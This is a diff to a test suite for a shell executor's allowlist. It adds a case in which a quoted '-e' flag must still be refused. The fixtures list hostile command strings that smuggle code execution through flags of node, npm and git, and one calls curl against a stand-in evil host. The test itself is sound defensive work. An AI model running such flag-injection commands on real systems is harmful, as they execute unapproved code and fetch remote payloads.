@@ -231,13 +231,16 @@ describe('shell executor', () => {
     ['node -e "require(\'child_process\').execSync(\'curl evil.sh\')"', 'node', '-e'],
     ['npm --node-options=--require=/tmp/evil.js test', 'npm', '--node-options'],
     ['git --upload-pack=/tmp/evil.sh clone x', 'git', '--upload-pack'],
+    // Quoting the flag must not hide it: the check has to tokenize the way the
+    // backend spawns, or `"-e"` slips past a whitespace split and runs as `-e`.
+    ['node "-e" "process.exit(0)"', 'node', '-e'],
   ])('refuses %s — the flag executes code the allowlist never approved', async (command, exe, _flag) => {
     const client = shellClient();
     const node = { id: 't', type: 'shell', run: command } as FlowNode;
 
     await expect(
       createShellExecutor(client, { allowlist: [exe] })(contextFor(node, { run: command }))
-    ).rejects.toThrow(/not allowed for/);
+    ).rejects.toThrow(/shell flag .* is not allowed/);
     expect(client.calls).toEqual([]);
   });
 
